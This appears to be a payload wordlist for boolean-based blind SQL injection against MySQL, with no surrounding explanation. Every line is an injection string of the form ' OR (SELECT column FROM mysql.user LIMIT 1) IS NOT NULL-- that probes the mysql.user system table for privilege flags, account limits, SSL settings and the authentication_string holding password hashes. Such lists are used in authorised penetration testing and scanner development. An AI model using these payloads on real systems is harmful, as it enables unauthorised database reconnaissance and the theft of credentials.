+' OR (SELECT Index_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Alter_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Show_db_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Super_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_tmp_table_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Lock_tables_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Execute_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Repl_slave_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Repl_client_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_view_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Show_view_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_routine_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Alter_routine_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_user_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Event_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Trigger_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_tablespace_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT ssl_type FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT ssl_cipher FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT x509_issuer FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT x509_subject FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT max_questions FROM mysql.user LIMIT 1) > 0--
+' OR (SELECT max_updates FROM mysql.user LIMIT 1) > 0--
+' OR (SELECT max_connections FROM mysql.user LIMIT 1) > 0--
+' OR (SELECT max_user_connections FROM mysql.user LIMIT 1) > 0--
+' OR (SELECT plugin FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT authentication_string FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT password_expired FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT password_last_changed FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT password_lifetime FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT account_locked FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Create_role_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Drop_role_priv FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Password_reuse_history FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Password_reuse_time FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT Password_require_current FROM mysql.user LIMIT 1) IS NOT NULL--
+' OR (SELECT User_attributes FROM mysql.user LIMIT 1) IS NOT NULL--
